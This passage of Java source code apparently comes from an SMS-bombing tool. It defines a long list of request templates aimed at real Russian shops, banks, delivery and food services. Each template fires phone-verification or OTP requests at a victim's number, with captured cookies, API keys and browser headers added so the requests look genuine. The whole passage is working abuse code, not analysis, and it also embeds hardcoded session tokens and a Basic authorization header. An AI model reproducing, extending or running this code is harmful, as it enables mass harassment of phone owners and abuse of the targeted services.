                        request.header("Cookie", "_ym_uid=1681049809433520032; _ym_d=1681049809; _ym_isad=2; cityid=1759; sbjs_migrations=1418474375998=1; sbjs_current_add=fd=2023-04-09 17:16:49|||ep=https://www.cdek.ru/ru/|||rf=(none); sbjs_first_add=fd=2023-04-09 17:16:49|||ep=https://www.cdek.ru/ru/|||rf=(none); sbjs_current=typ=typein|||src=(direct)|||mdm=(none)|||cmp=(none)|||cnt=(none)|||trm=(none); sbjs_first=typ=typein|||src=(direct)|||mdm=(none)|||cmp=(none)|||cnt=(none)|||trm=(none); sbjs_udata=vst=1|||uip=(none)|||uag=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36; sbjs_session=pgs=1|||cpg=https://www.cdek.ru/ru/; _ym_visorc=b; _ga=GA1.2.778360079.1681049810; _gid=GA1.2.629305455.1681049810; _gat_UA-4806124-1=1; tmr_lvid=7653af96d3bc11f6b8066e3ac0663428; tmr_lvidTS=1681049809839; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; _fbp=fb.1.1681049809933.1196859599; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; _tt_enable_cookie=1; _ttp=j567hcxgZMrL8i_BzsrwDS81Zl3; flomni_5d713233e8bc9e000b3ebfd2={\"userHash\":\"b7ea40fa-0bfe-491f-bbae-f151c2a9810e\"}; tmr_detect=0|1681049812179");

                        return "{\"locale\":\"ru\",\"websiteId\":\"ru\",\"phone\":\"+" + phone + "\",\"token\":null}";
                    }
                },

                new FormService("https://citystarwear.com/bitrix/templates/bs-base/php/includes/bs-handlers.php", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("cookie", "PHPSESSID=UuKiYPniPAdXVBBtNljDS7UPZdha49Cc; I_BITRIX2_SM_bsSiteVersionRun=D; I_BITRIX2_SM_SALE_UID=fa184708de2bc9dd79e83a8055c6177d; _ga=GA1.2.2134493673.1681050316; _gid=GA1.2.1923476411.1681050316; _gat=1; _gat_gtag_UA_107697781_1=1; _ym_uid=1681050316671922748; _ym_d=1681050316; tmr_lvid=b8f88e748040d447a7dd09460adb4d95; tmr_lvidTS=1681050315683; _ym_isad=2; _ym_visorc=w; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; roistat_visit=184510; roistat_first_visit=184510; roistat_visit_cookie_expire=1209600; cto_bundle=29NzTF9uUDJTYWo2N0E1QWJTVm9FZnZTd2FTTDk1SFNjN2dYdG0wb0s4bFNkNktnZHpMa1ElMkJybCUyQnUlMkJ5SHA4aEtZWUozSXpaRWowSXZtRUVuYmF6MFdsNDBhaFJsM2VIVnRzUTUlMkZCdFpmM0JIVDJjbXcyeHJmMXdCMEhsN1dqVks1OGhs; roistat_cookies_to_resave=roistat_ab,roistat_ab_submit,roistat_visit; ___dc=975af4da-b307-4c03-a397-86b1121a74e1; tmr_detect=0|1681050317970;");

                        builder
                                .add("phone", phone.getPhone())
                                .add("hdlr", "bsSendCallCode")
                                .add("key", "DOvBhIav34535434v212SEoVINS")
                                .add("dataForm[phone]", phone.getPhone())
                                .add("dataForm[callNums]", "")
                                .add("dataForm[smsCode]", "")
                                .add("dataForm[email]", "")
                                .add("dataForm[ecode]", "")
                                .add("O3Clz", "ZXrHlWj8wGf8qVwyImyJnbYZY")
                                .add("7UxNZ", "1wYb5BjwpiyXHUWijh8vdvMj8")
                                .add("Bvmeh", "lgrCt3RBmF2iB9Q8rV3KCM2fT")
                                .add("7Mwtq", "Ll4RkH341728SQPCZ4mrjo7AD")
                                .add("05NkY", "Shtl9WZihZuuMY43uUcF4TqJ2")
                                .add("N9n3d", "cQibFHON1g0i3yOHLsOjhv0pW")
                                .add("KNaaw", "02UVQnrFFLxTD1EJ2Q7X9YeGo")
                                .add("33f0Q", "QbpHWRptZudzLK88H5uhLnPuB")
                                .add("NLqjP", "V2KdwIrmw09pQJRSWXUwM2PuU")
                                .add("JqHV2", "aKmpJNgOHDoJrZ8xLT7vMaJur");
                    }
                },

                new FormService(" https://lk.zaim-express.ru/Account/RegisterCode", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "_ym_uid=1677588936312422059; _ym_d=1677588936; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; _ze_visiter=BBD44883-7DB0-4BC4-B331-D9DFF8B24051; _ze_referer=https://www.google.com/; _ze_referer_time=20230409174230; tmr_lvid=ccd00df5ac74424a769b5f262a180818; tmr_lvidTS=1681051352238; _gid=GA1.2.1372097639.1681051352; _ym_isad=2; _ym_visorc=w; _hjFirstSeen=1; _hjIncludedInSessionSample_1926565=0; _hjSession_1926565=eyJpZCI6IjIwZTRlNGUzLWYyZGEtNDU3Ny1hYmU2LTE1NzBhZmIzMWRlOCIsImNyZWF0ZWQiOjE2ODEwNTEzNTI1ODIsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; _fbp=fb.1.1681051353018.215763853; .LoanExpress.Session=CfDJ8LfbWLtL0iJEnA0TxaiJ2NXj/r2yRlFi4x5VQREdNf5rsUkJ3yrU0uIPYDOOVYLU/C/PWLoS5/xKXvaSSq2utdGI2yjNGbF3sWP46CSPy+zQGanUtzm+5YlNbuuNf//3P/4KMx7W0tHxpoHfgndbKMI1oDvVdWhhTr9WjyyVEvam; .AspNetCore.Antiforgery.YwBUPdAxP0c=CfDJ8LfbWLtL0iJEnA0TxaiJ2NV4Bc9G7NXmZcZmkkLtB2B7VGzfoEOtyG_8I9hFphEjDvJN_4Ob27RarXU-QuVoBiv1THQCjjXJcMdvm6LtB5etVecQy1OzJY5Nc3s7YTuWzIyFWE2RrGNP9utz2vYmsMA; pt_s_2f1af163=vt=1681051367413&cad=; _hjSessionUser_1926565=eyJpZCI6Ijk2MzliZmQ3LWY4M2EtNTYyZC1iNmFjLWE0ZGMzZDAzM2M1OSIsImNyZWF0ZWQiOjE2ODEwNTEzNTI1NzAsImV4aXN0aW5nIjp0cnVlfQ==; pt_2f1af163=deviceId=b11694e8-3a40-4cd2-a0ad-55697497f002&sessionId=771fabc0-5c53-4c4e-84ca-0a96929437d7&accountId=&vn=1&pvn=2&sact=1681051368744&; _ga_2JB47PMSVE=GS1.1.1681051351.3.1.1681051369.0.0.0; _ga=GA1.2.1772293061.1677588936");

                        builder.add("CellNumber", phone.format("+7 (***) ***-**-**"));
                    }
                },

                new FormService("https://online.globus.ru/?hyper=5011&utm_source=globus.ru&utm_medium=menu&utm_campaign=online.globus.ru&utm_content=shapka-sajta", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.headers(
                                new Headers.Builder()
                                        .add("bx-ajax", "true")
                                        .add("referer", "https://online.globus.ru/?hyper=5011&utm_source=globus.ru&utm_medium=menu&utm_campaign=online.globus.ru&utm_content=shapka-sajta")
                                        .addUnsafeNonAscii("Cookie", "globus_hyper_id=73; areal_user_change_city=krasnogorsk; globus_hyper_name=Красногорск; _ym_uid=1664469178997278156; _ym_d=1677585277; _fbp=fb.1.1677585277552.1677594909; _gid=GA1.2.1742009735.1681051545; _ym_isad=2; _ym_visorc=w; globus_hyper_show_select=1; _source=globus.ru; url_hyper_id=5011; online_hyper_id=5011; BITRIX_SM_SALE_UID=bb2579f9d0a9f9db5049c979d5cf5464; BITRIX_SM_GUEST_ID=21741551; rrpvid=327738943289815; flocktory-uuid=2df10288-6654-490d-94b7-7ab941005cd1-7; advcake_session_id=30746353-5e1c-577e-3938-2928cdfc6d66; advcake_track_url=https://online.globus.ru/?hyper=5011&utm_source=globus.ru&utm_medium=menu&utm_campaign=online.globus.ru&utm_content=shapka-sajta; advcake_utm_partner=online.globus.ru; advcake_utm_webmaster=shapka-sajta; advcake_click_id=; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; rcuid=6275fcd65368be000135cd22; g4c_x=1; _gcl_au=1.1.844509765.1681051553; _gasessionid=20b3d9a6-c350-45c1-a6bb-6b4d1ef7834e; gtm-session-start=1681051552603; pages_cnt=2; hypermarket=Ð“Ð»Ð¾Ð±ÑƒÑ\u0081 ÐšÑ€Ð°Ñ\u0081Ð½Ð¾Ð³Ð¾Ñ€Ñ\u0081Ðº; tmr_lvid=8b138313c85db7519bfc51951d12f393; tmr_lvidTS=1681051552987; st_uid=0639fd1ba9cd8effe5b8f5060da0d2a2; BITRIX_CONVERSION_CONTEXT_s2={\"ID\":60,\"EXPIRE\":1681073940,\"UNIQUE\":[\"conversion_visit_day\"]}; rai_new=6a6d288901a10983aa53ff2df67ac730; adrdel=1; adrcid=Ats7lVWd-xTEYAobZkom0YQ; analytic_id=1681051557269; timeSent=1; globusid=TUbN6Ig2NRhGT5emehZfeayed0RV7XmV; advcake_track_id=4c80f385-cdd2-7a8f-226f-c893466b602e; pagesCount=1; _ga_WYXVN1FFMV=GS1.1.1681051552.1.1.1681052245.60.0.0; _ga=GA1.2.66925213.1677585277; _gaclientid=66925213.1677585277; _gat_UA-6261130-10=1; tmr_detect=0|1681052248658; _gahitid=2023-04-09T17:57:31.332+03:00")
                                        .build()
                        );

                        builder
                                .add("AUTH_FORM", "Y")
                                .add("TYPE", "AUTH")
                                .add("FORM[AUTH_TYPE]", "PHONE")
                                .add("FORM[PHONE]", phone.format("+7 (***) ***-**-**"));
                    }
                },

                new JsonService("https://sushisell.goulash.tech/api/user/register", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request
                                .header("uuid", "d87a7be3-a23e-720b-d51b-2f23a0d21ff6")
                                .header("sitenew", "1")
                                .header("x-api-key", "5349854");

                        return "{\"phone\":\"" + phone.getPhone() + "\",\"password\":\"qwertyuiop\",\"password_repeat\":\"qwertyuiop\",\"verify_type\":\"call\"}";
                    }
                },

                new FormService("https://yaposhka-kurgan.ru/user/ajax.php?do=sms_code", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "__ddg1_=wJptxJVBMrU9lG19rHQD; PHPSESSID=94c8b47f3ae1f7799422b4a2cbf51b92; _ym_uid=1681491220765009924; _ym_d=1681491220; _ym_visorc=w; _ym_isad=2");

                        builder.add("phone", phone.format("8(***)***-**-**"));
                    }
                },

                new FormService("https://ninjapizza.ru/local/ajax/auth.php", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder
                                .add("action", "sendConfirmCode")
                                .add("phone", phone.format("+7(***) ***-**-**"));

                        request.header("Sec-Fetch-Dest", "empty");
                        request.header("Sec-Fetch-Mode", "cors");
                        request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
                        request.header("sec-ch-ua-mobile", "?0");
                        request.header("sec-ch-ua-platform", "\"Windows\"");
                        request.header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36");

                        request
                                .header("Referer", "https://ninjapizza.ru/")
                                .header("Cookie", "PHPSESSID=3f5c44a55d3c84848882848cdab3ad97; BITRIX_SM_SALE_UID=f56452f388c6da46e11626c0a6cfeaed; tmr_lvid=6b25f8b340361caef2cd67e9b109a79f; tmr_lvidTS=1681491423621; mgo_sb_migrations=1418474375998%3D1; mgo_sb_current=typ%3Dtypein%7C%2A%7Csrc%3D%28direct%29%7C%2A%7Cmdm%3D%28none%29%7C%2A%7Ccmp%3D%28none%29%7C%2A%7Ccnt%3D%28none%29%7C%2A%7Ctrm%3D%28none%29%7C%2A%7Cmango%3D%28none%29; mgo_sb_first=typ%3Dtypein%7C%2A%7Csrc%3D%28direct%29%7C%2A%7Cmdm%3D%28none%29%7C%2A%7Ccmp%3D%28none%29%7C%2A%7Ccnt%3D%28none%29%7C%2A%7Ctrm%3D%28none%29%7C%2A%7Cmango%3D%28none%29; mgo_sb_session=pgs%3D1%7C%2A%7Ccpg%3Dhttps%3A%2F%2Fninjapizza.ru%2F; mgo_uid=P6pVWSUkgdX0sMtBtjz3; mgo_cnt=1; mgo_sid=vjiprt473411001l5o23; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; isScrollRoistat=1; roistat_visit=2383899; roistat_first_visit=2383899; roistat_visit_cookie_expire=1209600; roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; gdeslon.ru.__arc_domain=gdeslon.ru; gdeslon.ru.user_id=4a291964-49f2-48d8-b032-a6c1ac8bba17; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; leadhunter_expire=1; ___dc=99f81639-c3b6-4e9c-8e58-63098c62bbe8; roistat_leadHunterScriptsShownCount={\"undefined\":1}; tmr_detect=0|1681491426317; _ym_uid=1681491429372068174; _ym_d=1681491429; _ym_isad=2; _ym_visorc=w; roistat_leadHunterCaught=1; roistat_cookies_to_resave=roistat_ab,roistat_ab_submit,roistat_visit,leadhunter_expire,roistat_leadHunterScriptsShownCount,roistat_leadHunterCaught")
                                .header("X-Requested-With", "XMLHttpRequest");
                    }
                },

                new JsonService("https://xn--90aamkcop0a.xn--p1ai/api/v5/user/start-authorization", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "JSESSIONID=97F79F14935101AB3241D4742C29D515; org.springframework.web.servlet.i18n.CookieLocaleResolver.LOCALE=ru; _ga=GA1.2.495684227.1681492282; _gid=GA1.2.1281782739.1681492282; _gat_my_tracker=1; _ym_uid=1644592791844501814; _ym_d=1681492282; _ym_visorc=w; v1_referrer_callibri=; v1_data=; _ym_isad=2; callibri_get_request=1681492294580");

                        return phone.format("{\"phone\":\"+7 *** ***-**-**\"}");
                    }
                },

                new FormService("https://sushifuji.ru/get_code_for_call_phone_authorization_site.php", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "sushifuji=WUwDv1oiRaXbj,K,0Z2374kSXYs1kwhTYu8bVX7MHn9brJFu; order_delivery_type=pickup; deviceId=b34371ffdefbfc3891eab2d54b0223fc; _ga=GA1.2.167094567.1681493376; _gid=GA1.2.1452399728.1681493376; _gat_gtag_UA_26277425_1=1; tmr_lvid=be8a32b94c9b95c3acd6e87400b6921d; tmr_lvidTS=1681493376335; _ym_uid=1681493377773716892; _ym_d=1681493377; _ym_isad=2; _ym_visorc=w; city_id=2; city_url=perm; cart_products={}; tmr_detect=0|1681493380477");

                        builder.add("phone", phone.toString());
                    }
                },

                new FormService("https://sushifuji.ru/get_code_for_sms_authorization_site.php", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "sushifuji=WUwDv1oiRaXbj,K,0Z2374kSXYs1kwhTYu8bVX7MHn9brJFu; order_delivery_type=pickup; deviceId=b34371ffdefbfc3891eab2d54b0223fc; _ga=GA1.2.167094567.1681493376; _gid=GA1.2.1452399728.1681493376; tmr_lvid=be8a32b94c9b95c3acd6e87400b6921d; tmr_lvidTS=1681493376335; _ym_uid=1681493377773716892; _ym_d=1681493377; _ym_isad=2; _ym_visorc=w; city_id=2; city_url=perm; cart_products={}; tmr_detect=0|1681493380477");

                        builder
                                .add("confirm_repeat", "true")
                                .add("phone_sms", phone.toString());
                    }
                },

                new CurlService("curl 'https://24htv.platform24.tv/v2/otps' \\\n" +
                        "  -H 'authority: 24htv.platform24.tv' \\\n" +
                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'accept-language: ru-ru' \\\n" +
                        "  -H 'content-type: application/json' \\\n" +
                        "  -H 'origin: https://24h.tv' \\\n" +
                        "  -H 'referer: https://24h.tv/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: cross-site' \\\n" +
                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  --data-raw '{\"phone\":\"{full_phone}\"}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://bankok.akbars.ru/identityabo/anonymousFlow/init' \\\n" +
                        "  -H 'Accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'Access-Control-Allow-Headers: *' \\\n" +
                        "  -H 'Connection: keep-alive' \\\n" +
                        "  -H 'Content-Type: application/json' \\\n" +
                        "  -H 'DeviceToken;' \\\n" +
                        "  -H 'Origin: https://online.akbars.ru' \\\n" +
                        "  -H 'Referer: https://online.akbars.ru/' \\\n" +
                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
                        "  -H 'Sec-Fetch-Site: same-site' \\\n" +
                        "  -H 'SessionToken;' \\\n" +
                        "  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  --data-raw '{\"phone\":\"{phone}\"}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://api.kazanexpress.ru/api/signin/phone' \\\n" +
                        "  -H 'authority: api.kazanexpress.ru' \\\n" +
                        "  -H 'accept: application/json' \\\n" +
                        "  -H 'accept-language: ru' \\\n" +
                        "  -H 'access-content-allow-origin: *' \\\n" +
                        "  -H 'authorization: Basic a2F6YW5leHByZXNzLWN1c3RvbWVyOmN1c3RvbWVyU2VjcmV0S2V5' \\\n" +
                        "  -H 'content-type: application/json' \\\n" +
                        "  -H 'origin: https://kazanexpress.ru' \\\n" +
                        "  -H 'referer: https://kazanexpress.ru/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-site' \\\n" +
                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  -H 'x-iid: a01c9fc3-2536-483f-9a30-d5e01b906b6e' \\\n" +
                        "  --data-raw '\"{phone}\"' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://api.sushcof.ru/api/user/register' \\\n" +
                        "  -H 'authority: api.sushcof.ru' \\\n" +
                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/json;charset=UTF-8' \\\n" +
                        "  -H 'origin: https://www.eda1.ru' \\\n" +
                        "  -H 'referer: https://www.eda1.ru/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: cross-site' \\\n" +
                        "  -H 'sitenew: 1' \\\n" +
                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  -H 'uuid: 2efbac03-8334-cf57-8c07-4b6e2f2b2113' \\\n" +
                        "  -H 'x-api-key: 12078554' \\\n" +
                        "  --data-raw '{\"phone\":\"{phone}\",\"password\":\"йцукенгшщз\",\"password_repeat\":\"йцукенгшщз\",\"verify_type\":\"call\"}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://beloris.ru/ajax/users/send_sms_login' \\\n" +
                        "  -H 'authority: beloris.ru' \\\n" +
                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'beloris-token: 4e0a565574502dd315584521af7445c7' \\\n" +
                        "  -H 'content-type: application/json;charset=UTF-8' \\\n" +
                        "  -H 'cookie: __ddg1_=jhfmggAwDzyS5PkJJDO5; _ga=GA1.2.1989106947.1682855671; _gid=GA1.2.408857361.1682855671; _gat_gtag_UA_37474329_1=1; _gcl_au=1.1.1605059988.1682855671; beloris_ab_groups=eyJpdiI6IkhJTjdtRGpmZVp5MmQ2ODRrYmRYekE9PSIsInZhbHVlIjoiYnlZMnpEOFA2aDhSNHVSbVZiREltTUVkUk51aHZ4cHFnQVNPTUZ5c3ROZ243OFA4bXN4Q1Q2S1VrTTNGTUx0NTRxU3Q0OFBoTGM1SlZwbVpGUVwvY3NBPT0iLCJtYWMiOiJkNWI1Y2YzZmVkNjM5MmUwZWFjMDRmYjczZTNhY2ZlMTViZWZlZGNlYjYwNWI1MDQ1MWYzODZmYjE0NzcwMzgyIn0%3D; _dc_gtm_UA-37474329-1=1; _ym_uid=1682855671367194138; _ym_d=1682855671; _ym_isad=2; _ym_visorc=w; flocktory-uuid=b050056d-2eff-4897-a579-2d45f8e3a78e-4; beloris_session=eyJpdiI6Ik52bmlkYURMOGJNWDlBZGN0NlhmU1E9PSIsInZhbHVlIjoiZlFaVUhLOUxFNXJQNlFPdHl0TkYwS1JrT0pVdVBEUEp6ZWV0STlhejN3dWU1WlBkNnhNZElcLzI1RDlYRlBBbFdKZ3RWNXVJWWJZbmdNXC9IXC9ycWl2b0pYXC84REtzcGNycWsyY0dkbTNVZEVQdmVsbGRlTnI2TGFYZHdRd1pJd3E2IiwibWFjIjoiOGJmZDUyZTA3OGQ5MTg1Y2M0YmM4OWM5MWUxN2Y2MjU2ZTBhMDFlNzlkNDQ0NTY4OTZhN2FjMmZjMTZkODE5MiJ9; BLUSHIP=eyJpdiI6IkRObU4xRjlwWStCVU9BUEZHVTdkamc9PSIsInZhbHVlIjoiaDYwQ1ZUcHhocWJwdWs4dnFmXC9OWlpZYm13ZVJwaVNMdkt4K0dxc2RtVGplZWpXWHkrRUVZMHFJRzgzT0xwV1FZZmxUVzVYVGp1OVBaK21sc2JnMnBmeWZyT2doOFJrdFJUbDAydGtRdmtnZjZqczJuRzUreEZRZkpSWlZWdCtOSjlmSHN0K0FqMG80QWpIN1NWNmdjWG9ERGg2WFF4VkJyU0tSajNPYncyUEJ3Wm9WZUk4bjY4ZkxDTnpNaDZHd3JFSlJWQlJNZGkzNzBVRytTcExISUpjdnVoM2ptWFcxQ1lJNDJPOHJYOEFHeGNkUElPbDRybUc0NllJMlVEMVwvQTEySnQxaUd6Ykk2Tkp2RUx5YUUwWldUcmMwQkxERm02THBuMVBoVkNoNTU0aEVvUFZOb2V0M0ZQeXl2bVY3R0xwSVdvazU0aFFWYllvNWhsV3ZSTXJ5MituSXBKRnUrV1ZFdEU5MVlwQlhLT01GS0FUcnFkMzFYSFZBTFVGQ3QyN1orV2FBXC9RREJzVjkrZGJySWx4VktIRkVQdGlVUWp3QTc2Ykd1dmVcLzZwWXdEaE0xUUNiSXgrNGxjcldscDdKK0lrRVozRlhseFpndlY3OFE3N1E5TDJoUkU4VXRsTkM4YVdnSFhkM0hKVUtGc3c4bUk1RWltTGpUd3lIb0NcL3lka0lDOHZaTnY1UktiZHJiWTF1SmI2WllIVHl3VW81Vldhd2lXRnBcL09PS1Y1UmlYY241UllZRjQ0Tll1N3NXUDlNS0RIMElPNUJEdTVzMUhmazBXa1Rwc0IyUXlDNjQwRlpHSlZFR2FQa0wrcW84cDFwU2xSY2hhaEZPU29KM1Viam1GcERoUjZoRm9qeVwvOXVlQnl3OTlXOW04UG5cL1RpeEVzM0FyYmUrUWhqa3RySUlQZWZvMTNNRVd3NlRcL3QxZlR3akR4ZDhzU3V3Rnh6eThTYlJnUlF4UktDZjMxM3FRV0psc0lLcXFjQWRQU2dVQzBYRzl1VzEwXC9yT2xMQ0xUR1UxOVJpUXo2ZjZCbWpEUFNYY2pmNnNySmhJNitUMTVyNTd1YmJMRXBzZnZ6ckNcL0lmZ2g5ZmhYaVV4MFVOaElpNUdMVGw4Z0k0VkhGcWw5c1daVGtua0UweDBoRWNzRVwvRFwvT2kwSnZYVndyQWg5QWJIWEpyOUhLXC9LOXcrQUFPalVaNURwUWlNY0Zvc1VJK3ZcL3pLTkNHSitqdlBuNVc4d25JYzJsQldTeTFKeE5MenVVYlNETEU3WlBzK29yWXpjdVE2TzR2K0lkeWhlWGlBYjA2Q3ZoN282Q3RuTDVKMzJ1SW1cL3lFYTV6bnBhT0ZHRjFlZ0FQQUNFNEdjdzFEdkRuK1p3OVJwMWxBSWlTSlhKTUdRbHJOZnROUUxlcjdiamJaT25NQnNxUFwvWERxT0lLWHZkNkhVeU9tNjNqVG5EZEh6UXBPU1wvajFxYjZCQmIwb1ZMK1YwR1dVd2pHTXVybm1jYUJXUmJScmVpQ3piMURmT3lyVTMzQVZSXC9acVgxVGJhYklCbUw1cE4zWExUeExzWCtKNkMxNlA0bFlvYTJ5bXY5ZlpvcHRwTVBuNk9wMGM5aFcrclZyUEc3bW53OXpJV2wrTlNtc3Jkamw4SjJpZDB4K2RWMzBvSUxqQVJ4WHBNNmo3XC9OT0I4U1pqYmVzWnpxZ2p4VVBHckRjR2taXC9wamxWNGxvT1VzS094RTRMeHlUMGYwanRFXC9abEY5dFwvc1ZSN3lsb1FXR3pcLzJcLzNRRVgzU0tzWEFHZUZlNiIsIm1hYyI6IjFhZTI2NmU2MGVlMWI0OGVmYjM4ZWM5NGRjNWIzNTgxZmE3YmI3NTQzMTdmN2FmOTEyYTA4YzcxYzgxNTExNTMifQ%3D%3D' \\\n" +
                        "  -H 'origin: https://beloris.ru' \\\n" +
                        "  -H 'referer: https://beloris.ru/?r=0.6576217973266996' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  -H 'x-beloris-ismobile: false' \\\n" +
                        "  -H 'x-bl-trust-key: ded232fa325402b384c18d9290af6ea8' \\\n" +
                        "  -H 'x-csrf-token;' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw '{\"phone\":\"+{phone:7(***) ***-****}\"}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://www.kspecmash.ru/ajax/confirm_phone.php?PHONE={formatted_phone:+*(***)***-**-**}&ACTION=CHECK_PHONE' \\\n" +
                        "  -H 'authority: www.kspecmash.ru' \\\n" +
                        "  -H 'accept: */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'cookie: PHPSESSID=xOsNETHAj3sdca051micg66I5s5FeqaV; BITRIX_SM_GUEST_ID=3821030; BITRIX_SM_SALE_UID=3fe7ebbad93048adea8a33d1565d7f56; _ym_uid=1682936034819024888; _ym_d=1682936034; _gid=GA1.2.933401020.1682936034; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A2%2C%22EXPIRE%22%3A1682974740%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_isad=2; cted=modId%3Dxozu5mri%3Bclient_id%3D1774221769.1682936034%3Bya_client_id%3D1682936034819024888; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ym_visorc=w; 